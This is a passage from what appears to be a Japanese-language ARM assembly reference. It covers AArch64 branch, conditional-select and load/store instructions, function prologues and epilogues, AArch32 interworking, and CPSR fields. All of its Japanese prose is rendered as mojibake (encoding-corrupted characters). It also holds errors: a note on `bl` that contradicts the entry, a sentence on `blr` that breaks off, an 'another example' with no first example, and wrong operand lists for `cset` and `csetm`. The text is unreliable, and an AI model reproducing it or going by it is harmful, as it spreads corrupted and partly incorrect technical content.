* **`tst`**: æ¯”è¼ƒã®å€¤ã®ã„ãšã‚Œã‹ãŒ1ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ï¼ˆçµæœã‚’ã©ã“ã«ã‚‚ä¿å­˜ã›ãšã«ANDSã®ã‚ˆã†ã«æ©Ÿèƒ½ã—ã¾ã™ï¼‰ã€‚å€¤ã§æŒ‡å®šã•ã‚ŒãŸãƒ¬ã‚¸ã‚¹ã‚¿ã®ãƒ“ãƒƒãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã€ãã®ãƒ“ãƒƒãƒˆãŒ1ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã®ã«ä¾¿åˆ©ã§ã™ã€‚
* ä¾‹: `tst X1, #7` X1ã®æœ€å¾Œã®3ãƒ“ãƒƒãƒˆã®ã„ãšã‚Œã‹ãŒ1ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™
* **`teq`**: çµæœã‚’ç ´æ£„ã™ã‚‹XORæ¼”ç®—
* **`b`**: ç„¡æ¡ä»¶åˆ†å²
* ä¾‹: `b myFunction`
* ã“ã‚Œã¯ãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã§åŸ‹ã‚ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼ˆæˆ»ã‚‹å¿…è¦ã®ã‚ã‚‹ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³å‘¼ã³å‡ºã—ã«ã¯é©ã—ã¦ã„ã¾ã›ã‚“ï¼‰
* **`bl`**: **ãƒªãƒ³ã‚¯ä»˜ãåˆ†å²**ã€**ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³**ã‚’**å‘¼ã³å‡ºã™**ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚**`x30`ã«æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ ¼ç´**ã—ã¾ã™ã€‚
* ä¾‹: `bl myFunction` â€” ã“ã‚Œã¯`myFunction`é–¢æ•°ã‚’å‘¼ã³å‡ºã—ã€æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’`x30`ã«æ ¼ç´ã—ã¾ã™ã€‚
* ã“ã‚Œã¯ãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã§åŸ‹ã‚ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼ˆæˆ»ã‚‹å¿…è¦ã®ã‚ã‚‹ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³å‘¼ã³å‡ºã—ã«ã¯é©ã—ã¦ã„ã¾ã›ã‚“ï¼‰
* **`blr`**: **ãƒ¬ã‚¸ã‚¹ã‚¿ã¸ã®ãƒªãƒ³ã‚¯ä»˜ãåˆ†å²**ã€**ãƒ¬ã‚¸ã‚¹ã‚¿**ã§**æŒ‡å®šã•ã‚ŒãŸ**ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã‚’**å‘¼ã³å‡ºã™**ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’`x30`ã«æ ¼ç´ã—ã¾ã™ã€‚ (ã“ã‚Œã¯
* ä¾‹: `blr x1` â€” ã“ã‚Œã¯`x1`ã«å«ã¾ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã®é–¢æ•°ã‚’å‘¼ã³å‡ºã—ã€æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’`x30`ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`ret`**: **ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³**ã‹ã‚‰**æˆ»ã‚‹**ã€é€šå¸¸ã¯**`x30`**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
* ä¾‹: `ret` â€” ã“ã‚Œã¯`x30`ã®æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ã—ã¦ç¾åœ¨ã®ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã‹ã‚‰æˆ»ã‚Šã¾ã™ã€‚
* **`b.<cond>`**: æ¡ä»¶ä»˜ãåˆ†å²
* **`b.eq`**: **ç­‰ã—ã„å ´åˆã«åˆ†å²**ã€å‰ã®`cmp`å‘½ä»¤ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚
* ä¾‹: `b.eq label` â€” å‰ã®`cmp`å‘½ä»¤ã§2ã¤ã®ç­‰ã—ã„å€¤ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€`label`ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
* **`b.ne`**: **ç­‰ã—ããªã„å ´åˆåˆ†å²**ã€‚ã“ã®å‘½ä»¤ã¯æ¡ä»¶ãƒ•ãƒ©ã‚°ã‚’ãƒã‚§ãƒƒã‚¯ã—ï¼ˆä»¥å‰ã®æ¯”è¼ƒå‘½ä»¤ã§è¨­å®šã•ã‚ŒãŸï¼‰ã€æ¯”è¼ƒã•ã‚ŒãŸå€¤ãŒç­‰ã—ããªã„å ´åˆã€æŒ‡å®šã•ã‚ŒãŸãƒ©ãƒ™ãƒ«ã‚„ã‚¢ãƒ‰ãƒ¬ã‚¹ã«åˆ†å²ã—ã¾ã™ã€‚
* ä¾‹: `cmp x0, x1` å‘½ä»¤ã®å¾Œã€`b.ne label` â€” ã‚‚ã— `x0` ã¨ `x1` ã®å€¤ãŒç­‰ã—ããªã„å ´åˆã€`label` ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
* **`cbz`**: **ã‚¼ãƒ­ã®å ´åˆåˆ†å²**ã€‚ã“ã®å‘½ä»¤ã¯ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ã‚¼ãƒ­ã¨æ¯”è¼ƒã—ã€ç­‰ã—ã„å ´åˆã€æŒ‡å®šã•ã‚ŒãŸãƒ©ãƒ™ãƒ«ã‚„ã‚¢ãƒ‰ãƒ¬ã‚¹ã«åˆ†å²ã—ã¾ã™ã€‚
* ä¾‹: `cbz x0, label` â€” ã‚‚ã— `x0` ã®å€¤ãŒã‚¼ãƒ­ã®å ´åˆã€`label` ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
* **`cbnz`**: **ã‚¼ãƒ­ã§ãªã„å ´åˆåˆ†å²**ã€‚ã“ã®å‘½ä»¤ã¯ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ã‚¼ãƒ­ã¨æ¯”è¼ƒã—ã€ç­‰ã—ããªã„å ´åˆã€æŒ‡å®šã•ã‚ŒãŸãƒ©ãƒ™ãƒ«ã‚„ã‚¢ãƒ‰ãƒ¬ã‚¹ã«åˆ†å²ã—ã¾ã™ã€‚
* ä¾‹: `cbnz x0, label` â€” ã‚‚ã— `x0` ã®å€¤ãŒã‚¼ãƒ­ã§ãªã„å ´åˆã€`label` ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
* **`tbnz`**: ãƒ“ãƒƒãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¦éã‚¼ãƒ­ã®å ´åˆåˆ†å²
* ä¾‹: `tbnz x0, #8, label`
* **`tbz`**: ãƒ“ãƒƒãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¦ã‚¼ãƒ­ã®å ´åˆåˆ†å²
* ä¾‹: `tbz x0, #8, label`
* **æ¡ä»¶ä»˜ãé¸æŠæ¼”ç®—**: æ¡ä»¶ãƒ“ãƒƒãƒˆã«ã‚ˆã£ã¦æŒ™å‹•ãŒç•°ãªã‚‹æ¼”ç®—ã§ã™ã€‚
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> çœŸã®å ´åˆã€X0 = X1ã€å½ã®å ´åˆã€X0 = X2
* `csinc Xd, Xn, Xm, cond` -> çœŸã®å ´åˆã€Xd = Xnã€å½ã®å ´åˆã€Xd = Xm + 1
* `cinc Xd, Xn, cond` -> çœŸã®å ´åˆã€Xd = Xn + 1ã€å½ã®å ´åˆã€Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> çœŸã®å ´åˆã€Xd = Xnã€å½ã®å ´åˆã€Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> çœŸã®å ´åˆã€Xd = NOT(Xn)ã€å½ã®å ´åˆã€Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> çœŸã®å ´åˆã€Xd = Xnã€å½ã®å ´åˆã€Xd = - Xm
* `cneg Xd, Xn, cond` -> çœŸã®å ´åˆã€Xd = - Xnã€å½ã®å ´åˆã€Xd = Xn
* `cset Xd, Xn, Xm, cond` -> çœŸã®å ´åˆã€Xd = 1ã€å½ã®å ´åˆã€Xd = 0
* `csetm Xd, Xn, Xm, cond` -> çœŸã®å ´åˆã€Xd = \<all 1>ã€å½ã®å ´åˆã€Xd = 0
* **`adrp`**: ã‚·ãƒ³ãƒœãƒ«ã®**ãƒšãƒ¼ã‚¸ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¨ˆç®—**ã—ã¦ãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã—ã¾ã™ã€‚
* ä¾‹: `adrp x0, symbol` â€” ã“ã‚Œã¯ `symbol` ã®ãƒšãƒ¼ã‚¸ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¨ˆç®—ã—ã€`x0` ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`ldrsw`**: ãƒ¡ãƒ¢ãƒªã‹ã‚‰ç¬¦å·ä»˜ã**32ãƒ“ãƒƒãƒˆ**å€¤ã‚’**ãƒ­ãƒ¼ãƒ‰**ã—ã€64ãƒ“ãƒƒãƒˆã«**ç¬¦å·æ‹¡å¼µ**ã—ã¾ã™ã€‚
* ä¾‹: `ldrsw x0, [x1]` â€” ã“ã‚Œã¯ `x1` ãŒæŒ‡ã™ãƒ¡ãƒ¢ãƒªä½ç½®ã‹ã‚‰ç¬¦å·ä»˜ã32ãƒ“ãƒƒãƒˆå€¤ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€64ãƒ“ãƒƒãƒˆã«ç¬¦å·æ‹¡å¼µã—ã¦ `x0` ã«æ ¼ç´ã—ã¾ã™ã€‚
* **`stur`**: ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’ãƒ¡ãƒ¢ãƒªä½ç½®ã«**ã‚¹ãƒˆã‚¢**ã—ã€åˆ¥ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã‹ã‚‰ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
* ä¾‹: `stur x0, [x1, #4]` â€” ã“ã‚Œã¯ `x1` ã«ç¾åœ¨ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚ˆã‚Š4ãƒã‚¤ãƒˆå¤§ãã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ãƒ¡ãƒ¢ãƒªã« `x0` ã®å€¤ã‚’æ ¼ç´ã—ã¾ã™ã€‚
* **`svc`** : **ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«**ã‚’è¡Œã„ã¾ã™ã€‚"Supervisor Call" ã®ç•¥ã§ã€ãƒ—ãƒ­ã‚»ãƒƒã‚µãŒã“ã®å‘½ä»¤ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¢ãƒ¼ãƒ‰ã‹ã‚‰ã‚«ãƒ¼ãƒãƒ«ãƒ¢ãƒ¼ãƒ‰ã«åˆ‡ã‚Šæ›¿ã‚ã‚Š**ã€**ã‚«ãƒ¼ãƒãƒ«ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«å‡¦ç†**ã‚³ãƒ¼ãƒ‰ãŒã‚ã‚‹ãƒ¡ãƒ¢ãƒªå†…ã®ç‰¹å®šã®å ´æ‰€ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
*   ä¾‹:

```armasm
mov x8, 93  ; ãƒ¬ã‚¸ã‚¹ã‚¿ x8 ã«çµ‚äº†ã®ãŸã‚ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ç•ªå·ï¼ˆ93ï¼‰ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
mov x0, 0   ; çµ‚äº†ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ï¼ˆ0ï¼‰ã‚’ãƒ¬ã‚¸ã‚¹ã‚¿ x0 ã«ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
svc 0       ; ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’è¡Œã„ã¾ã™ã€‚
```

### **é–¢æ•°ãƒ—ãƒ­ãƒ­ãƒ¼ã‚°**

1. **ãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿ã¨ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«ä¿å­˜**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **æ–°ã—ã„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ã‚’è¨­å®šã™ã‚‹**: `mov x29, sp` (ç¾åœ¨ã®é–¢æ•°ã®ãŸã‚ã«æ–°ã—ã„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ã‚’è¨­å®šã™ã‚‹)
3. **ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°ç”¨ã®ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®ã‚¹ãƒšãƒ¼ã‚¹ã‚’å‰²ã‚Šå½“ã¦ã‚‹**ï¼ˆå¿…è¦ãªå ´åˆï¼‰: `sub sp, sp, <size>`ï¼ˆã“ã“ã§ `<size>` ã¯å¿…è¦ãªãƒã‚¤ãƒˆæ•°ã§ã™ï¼‰

### **é–¢æ•°ã‚¨ãƒ”ãƒ­ãƒ¼ã‚°**

1. **ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°ã‚’è§£æ”¾ã™ã‚‹ï¼ˆå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¦ã„ã‚‹å ´åˆï¼‰**: `add sp, sp, <size>`
2. **ãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿ã¨ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿ã‚’å¾©å…ƒã™ã‚‹**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret`ï¼ˆãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿å†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ã—ã¦å‘¼ã³å‡ºã—å…ƒã«åˆ¶å¾¡ã‚’è¿”ã—ã¾ã™ï¼‰

## AARCH32 å®Ÿè¡ŒçŠ¶æ…‹

Armv8-A ã¯ 32 ãƒ“ãƒƒãƒˆãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œã‚’ã‚µãƒãƒ¼ãƒˆã—ã¾ã™ã€‚**AArch32** ã¯ **`A32`** ã¨ **`T32`** ã® **2 ã¤ã®å‘½ä»¤ã‚»ãƒƒãƒˆ**ã®ã„ãšã‚Œã‹ã§å®Ÿè¡Œã§ãã€**`interworking`** ã‚’ä»‹ã—ã¦ãã‚Œã‚‰ã®é–“ã‚’åˆ‡ã‚Šæ›¿ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
**ç‰¹æ¨©ã‚’æŒã¤** 64 ãƒ“ãƒƒãƒˆãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ã€ä¾‹å¤–ãƒ¬ãƒ™ãƒ«ã®è»¢é€ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€**32 ãƒ“ãƒƒãƒˆã®ä½ç‰¹æ¨©**ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œã‚’ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ãã¾ã™ã€‚\
64 ãƒ“ãƒƒãƒˆã‹ã‚‰ 32 ãƒ“ãƒƒãƒˆã¸ã®ç§»è¡Œã¯ã€ä¾‹å¤–ãƒ¬ãƒ™ãƒ«ã®ä½ä¸‹ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ï¼ˆãŸã¨ãˆã°ã€EL1 ã§ã® 64 ãƒ“ãƒƒãƒˆãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒ EL0 ã§ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹å ´åˆï¼‰ã€‚ã“ã‚Œã¯ã€`AArch32` ãƒ—ãƒ­ã‚»ã‚¹ã‚¹ãƒ¬ãƒƒãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹æº–å‚™ãŒã§ããŸã¨ãã«ã€**`SPSR_ELx`** ç‰¹æ®Šãƒ¬ã‚¸ã‚¹ã‚¿ã® **ãƒ“ãƒƒãƒˆ 4 ã‚’ 1 ã«è¨­å®š**ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã€`SPSR_ELx` ã®æ®‹ã‚Šã®éƒ¨åˆ†ã¯ **`AArch32`** ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã® CPSR ã‚’æ ¼ç´ã—ã¾ã™ã€‚ãã®å¾Œã€ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã¯ **`ERET`** å‘½ä»¤ã‚’å‘¼ã³å‡ºã—ã¦ãƒ—ãƒ­ã‚»ãƒƒã‚µãŒ **`AArch32`** ã«é·ç§»ã—ã€CPSR ã«å¿œã˜ã¦ A32 ã¾ãŸã¯ T32 ã«å…¥ã‚Šã¾ã™\*\*ã€‚\*\*

**`interworking`** ã¯ CPSR ã® J ãƒ“ãƒƒãƒˆã¨ T ãƒ“ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦è¡Œã‚ã‚Œã¾ã™ã€‚`J=0` ã‹ã¤ `T=0` ã¯ **`A32`** ã‚’æ„å‘³ã—ã€`J=0` ã‹ã¤ `T=1` ã¯ **T32** ã‚’æ„å‘³ã—ã¾ã™ã€‚ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€å‘½ä»¤ã‚»ãƒƒãƒˆãŒ T32 ã§ã‚ã‚‹ã“ã¨ã‚’ç¤ºã™ãŸã‚ã« **æœ€ä¸‹ä½ãƒ“ãƒƒãƒˆã‚’ 1 ã«è¨­å®š**ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚\
ã“ã‚Œã¯ **interworking åˆ†å²å‘½ä»¤**ä¸­ã«è¨­å®šã•ã‚Œã¾ã™ãŒã€PC ãŒå®›å…ˆãƒ¬ã‚¸ã‚¹ã‚¿ã¨ã—ã¦è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã«ä»–ã®å‘½ä»¤ã§ç›´æ¥è¨­å®šã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä¾‹ï¼š

åˆ¥ã®ä¾‹ï¼š
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### ãƒ¬ã‚¸ã‚¹ã‚¿

32ãƒ“ãƒƒãƒˆã®ãƒ¬ã‚¸ã‚¹ã‚¿ãŒ16å€‹ã‚ã‚Šã¾ã™ï¼ˆr0-r15ï¼‰ã€‚**r0ã‹ã‚‰r14ã¾ã§**ã€**ã©ã‚“ãªæ“ä½œã«ã‚‚ä½¿ç”¨**ã§ãã¾ã™ãŒã€ä¸€éƒ¨ã¯é€šå¸¸äºˆç´„ã•ã‚Œã¦ã„ã¾ã™ï¼š

- **`r15`**ï¼šãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚«ã‚¦ãƒ³ã‚¿ï¼ˆå¸¸ã«ï¼‰ã€‚æ¬¡ã®å‘½ä»¤ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæ ¼ç´ã•ã‚Œã¾ã™ã€‚A32ã§ã¯ç¾åœ¨+8ã€T32ã§ã¯ç¾åœ¨+4ã€‚
- **`r11`**ï¼šãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¤ãƒ³ã‚¿
- **`r12`**ï¼šæ‰‹ç¶šãå†…å‘¼ã³å‡ºã—ãƒ¬ã‚¸ã‚¹ã‚¿
- **`r13`**ï¼šã‚¹ã‚¿ãƒƒã‚¯ãƒã‚¤ãƒ³ã‚¿
- **`r14`**ï¼šãƒªãƒ³ã‚¯ãƒ¬ã‚¸ã‚¹ã‚¿

ã•ã‚‰ã«ã€ãƒ¬ã‚¸ã‚¹ã‚¿ã¯**`ãƒãƒ³ã‚¯ä»˜ããƒ¬ã‚¸ã‚¹ã‚¿`**ã«ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€ä¾‹å¤–å‡¦ç†ã‚„ç‰¹æ¨©æ“ä½œã§**é«˜é€Ÿãªã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆåˆ‡ã‚Šæ›¿ãˆ**ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€ãƒ¬ã‚¸ã‚¹ã‚¿ã®å€¤ã‚’ä¿å­˜ã—ã¦ãŠãå ´æ‰€ã§ã™ã€‚\
ã“ã‚Œã¯ã€ä¾‹å¤–ãŒç™ºç”Ÿã—ãŸãƒ—ãƒ­ã‚»ãƒƒã‚µãƒ¢ãƒ¼ãƒ‰ã®`CPSR`ã‹ã‚‰ãƒ—ãƒ­ã‚»ãƒƒã‚µã®`SPSR`ã«ãƒ—ãƒ­ã‚»ãƒƒã‚µçŠ¶æ…‹ã‚’ä¿å­˜ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã¾ã™ã€‚ä¾‹å¤–ãŒè¿”ã•ã‚Œã‚‹ã¨ã€`CPSR`ã¯`SPSR`ã‹ã‚‰å¾©å…ƒã•ã‚Œã¾ã™ã€‚

### CPSR - ç¾åœ¨ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãƒ¬ã‚¸ã‚¹ã‚¿

AArch32ã§ã¯ã€CPSRã¯AArch64ã®**`PSTATE`**ã¨åŒæ§˜ã«æ©Ÿèƒ½ã—ã€ä¾‹å¤–ãŒç™ºç”Ÿã™ã‚‹ã¨å¾Œã§å®Ÿè¡Œã‚’å¾©å…ƒã™ã‚‹ãŸã‚ã«**`SPSR_ELx`**ã«ã‚‚ä¿å­˜ã•ã‚Œã¾ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¯ã„ãã¤ã‹ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«åˆ†ã‹ã‚Œã¦ã„ã¾ã™ï¼š

- ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãƒ¬ã‚¸ã‚¹ã‚¿ï¼ˆAPSRï¼‰ï¼šç®—è¡“ãƒ•ãƒ©ã‚°ã¨EL0ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½
- å®Ÿè¡ŒçŠ¶æ…‹ãƒ¬ã‚¸ã‚¹ã‚¿ï¼šãƒ—ãƒ­ã‚»ã‚¹ã®å‹•ä½œï¼ˆOSã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã‚‹ï¼‰ã€‚

#### ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãƒ¬ã‚¸ã‚¹ã‚¿ï¼ˆAPSRï¼‰

- **`N`**ã€**`Z`**ã€**`C`**ã€**`V`** ãƒ•ãƒ©ã‚°ï¼ˆAArch64ã¨åŒæ§˜ï¼‰
- **`Q`** ãƒ•ãƒ©ã‚°ï¼šå°‚ç”¨ã®é£½å’Œæ¼”ç®—å‘½ä»¤ã®å®Ÿè¡Œä¸­ã«**æ•´æ•°ã®é£½å’ŒãŒç™ºç”Ÿã™ã‚‹**ã¨ãã«1ã«è¨­å®šã•ã‚Œã¾ã™ã€‚ä¸€åº¦**`1`**ã«è¨­å®šã•ã‚Œã‚‹ã¨ã€æ‰‹å‹•ã§0ã«è¨­å®šã•ã‚Œã‚‹ã¾ã§å€¤ãŒç¶­æŒã•ã‚Œã¾ã™ã€‚ã•ã‚‰ã«ã€ãã®å€¤ã‚’æš—é»™çš„ã«ãƒã‚§ãƒƒã‚¯ã™ã‚‹å‘½ä»¤ã¯å­˜åœ¨ã›ãšã€å€¤ã‚’æ‰‹å‹•ã§èª­ã¿å–ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
- **`GE`**ï¼ˆä»¥ä¸Šã¾ãŸã¯ç­‰ã—ã„ï¼‰ãƒ•ãƒ©ã‚°ï¼šã“ã‚Œã¯SIMDï¼ˆSingle Instruction, Multiple Dataï¼‰æ¼”ç®—ã§ä½¿ç”¨ã•ã‚Œã€"parallel add"ã‚„"parallel subtract"ãªã©ã®æ“ä½œã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ“ä½œã¯ã€1ã¤ã®å‘½ä»¤ã§è¤‡æ•°ã®ãƒ‡ãƒ¼ã‚¿ãƒã‚¤ãƒ³ãƒˆã‚’å‡¦ç†ã§ãã¾ã™ã€‚

ãŸã¨ãˆã°ã€**`UADD8`** å‘½ä»¤ã¯ã€ä¸¦åˆ—ã«4çµ„ã®ãƒã‚¤ãƒˆï¼ˆ2ã¤ã®32ãƒ“ãƒƒãƒˆã‚ªãƒšãƒ©ãƒ³ãƒ‰ã‹ã‚‰ï¼‰ã‚’è¿½åŠ ã—ã€çµæœã‚’32ãƒ“ãƒƒãƒˆãƒ¬ã‚¸ã‚¹ã‚¿ã«æ ¼ç´ã—ã¾ã™ã€‚æ¬¡ã«ã€ã“ã‚Œã‚‰ã®çµæœã«åŸºã¥ã„ã¦ã€**`APSR`**ã®**`GE`** ãƒ•ãƒ©ã‚°ãŒè¨­å®šã•ã‚Œã¾ã™ã€‚å„GEãƒ•ãƒ©ã‚°ã¯1ã¤ã®ãƒã‚¤ãƒˆã®è¿½åŠ ã«å¯¾å¿œã—ã€ãã®ãƒã‚¤ãƒˆã®ãƒšã‚¢ã®è¿½åŠ ãŒ**ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã—ãŸã‹ã©ã†ã‹**ã‚’ç¤ºã—ã¾ã™ã€‚

**`SEL`** å‘½ä»¤ã¯ã“ã‚Œã‚‰ã®GEãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦æ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

#### å®Ÿè¡ŒçŠ¶æ…‹ãƒ¬ã‚¸ã‚¹ã‚¿

- **`J`** ãŠã‚ˆã³ **`T`** ãƒ“ãƒƒãƒˆï¼š**`J`** ã¯0ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€**`T`** ãŒ0ã®å ´åˆã¯A32å‘½ä»¤ã‚»ãƒƒãƒˆãŒä½¿ç”¨ã•ã‚Œã€1ã®å ´åˆã¯T32ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
- **ITãƒ–ãƒ­ãƒƒã‚¯ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¬ã‚¸ã‚¹ã‚¿**ï¼ˆ`ITSTATE`ï¼‰ï¼šã“ã‚Œã‚‰ã¯10-15ãŠã‚ˆã³25-26ã®ãƒ“ãƒƒãƒˆã§ã™ã€‚**`IT`** ã§æ¥é ­è¾ãŒä»˜ã„ãŸã‚°ãƒ«ãƒ¼ãƒ—å†…ã®å‘½ä»¤ã®æ¡ä»¶ã‚’æ ¼ç´ã—ã¾ã™ã€‚
- **`E`** ãƒ“ãƒƒãƒˆï¼š**ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ãƒã‚¹**ã‚’ç¤ºã—ã¾ã™ã€‚
